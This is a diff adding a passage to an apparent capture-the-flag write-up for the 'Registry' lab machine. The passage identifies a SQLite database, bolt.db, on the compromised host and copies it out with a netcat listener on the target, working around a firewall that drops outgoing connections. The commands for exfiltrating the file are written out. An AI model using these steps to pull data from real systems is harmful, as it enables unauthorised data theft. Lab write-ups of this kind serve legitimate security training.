@@ -342,3 +342,22 @@ That config file has details about a database called "bolt.db" and a URL locatio
 ## Accessing Bolt App
 
 It's usually good practice to try previously found credentials on new targets like this, but so far we don't have the right ones. Instead, continue the enumeration by looking into the other info found from the config file, "bolt.db". 
+
+Using the `file` command to find out what kind of database it is, you'll see it's made with sqlite3. 
+
+{% highlight console %}
+bolt@bolt:/var/www/html/bolt/app/database$ file bolt.db
+bolt.db: SQLite 3.x database, last written using SQLite version 3022000
+{% endhighlight %}
+
+Unfortunately, the box doesn't have sqlite3 program installed so we can't directly open it from there, it has to first be copied out first. One way to do that is by using netcat.
+
+There must be some firewall rules set up to drop outgoing connections, because none of my attempts to send the file back the way I normally do it worked. So instead, it has to be done by setting up the listener on the remote box first.
+
+`nc -lvnp 5555 < bolt.db`
+
+And on your local machine use netcat to connect to the listener, with it set up to save data sent to it as the database file.
+
+`nc registry.htb 5555 > bolt.db`
+
+Once you enter that command, it will connect and receive the database, then you'll just need to kill the connection and analyze the file!
